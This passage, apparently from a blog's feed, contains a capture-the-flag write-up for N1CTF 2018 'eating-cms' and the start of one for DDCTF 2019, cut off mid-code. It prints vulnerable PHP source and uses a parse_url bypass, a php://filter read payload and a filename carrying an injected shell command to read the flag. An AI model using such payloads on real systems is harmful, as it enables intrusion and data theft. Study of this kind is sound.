punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ERROR</span> <span class="token operator">|</span> <span class="token class-name">E_WARNING</span> <span class="token operator">|</span> <span class="token class-name">E_PARSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">BASEDIR</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE_admin</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'manage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$DBHOST</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$DBUSER</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$DBPASS</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Nu1LCTF2018!@#qwe"</span><span class="token punctuation">;</span><span class="token comment">//$DBPASS = "";</span><span class="token variable">$DBNAME</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"N1CTF"</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$DBHOST</span><span class="token punctuation">,</span> <span class="token variable">$DBUSER</span><span class="token punctuation">,</span> <span class="token variable">$DBPASS</span><span class="token punctuation">,</span> <span class="token variable">$DBNAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no sql connection"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>updateadmin.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/update.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæœ‰parse_url()ï¼Œå¯ä»¥å°è¯•phpçš„è§£ææ¼æ´</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819224520220.png"></p><h3 id="parse-url-è§£ææ¼æ´"><a href="#parse-url-è§£ææ¼æ´" class="headerlink" title="parse_url()è§£ææ¼æ´"></a>parse_url()è§£ææ¼æ´</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><p><a href="http://127.0.0.1/1.php?a=123">http://127.0.0.1/1.php?a=123</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819225541928.png"></p></li><li><p><a href="http://127.0.0.1//1.php?a=123">http://127.0.0.1//1.php?a=123</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819225609362.png"></p></li><li><p><a href="http://127.0.0.1///1.php?a=123">http://127.0.0.1///1.php?a=123</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819225636243.png"></p></li></ul><p>è¿™é‡Œç”¨ä¸¤ä¸ª//ä¹Ÿè¡Œï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç‰ˆæœ¬é—®é¢˜ã€‚</p><p>è¯»å–ffffllllaaaaggg.php</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can find sth in m4aaannngggeee"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>m4aaannngggeee.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/upload.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å¼€/templates/upload.html</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819225951089.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819230004733.png"></p><p>templatesé‡Œæ€ä¹ˆä¼šæœ‰phpæ–‡ä»¶å‘¢ï¼Ÿ</p><p>å°è¯•è¯»å–upllloadddd.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:not an upload fileï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/png;base64,"</span> <span class="token operator">.</span> <span class="token variable">$picdata</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å­—ç¬¦ä¸²æ‹¼æ¥è€Œæˆçš„shellå‘½ä»¤ï¼Œæ˜æ˜¾å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><pre class="line-numbers language-none"><code class="language-none">system(&quot;cat 123;cat flag;# |base 64 -w 0&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819230654935.png"></p><p>ä½†ä¸Šä¼ ç‚¹ä¸åœ¨è¿™ï¼Œç«Ÿç„¶åœ¨/user.php?page=m4aaannngggeee</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819231049213.png"></p><p>ls /ä¸è¡Œï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚çœ‹äº†ä¸‹ä»£ç ä¹Ÿæ²¡è¿‡æ»¤å‘€ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-N1CTF-2018-eating-cms/image-20210819232125222.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[DDCTF 2019]homebrew event loop</title>
      <link href="/p/203110635.html"/>
      <url>/p/203110635.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[flask|sessionè§£å¯†]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819150806086.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token 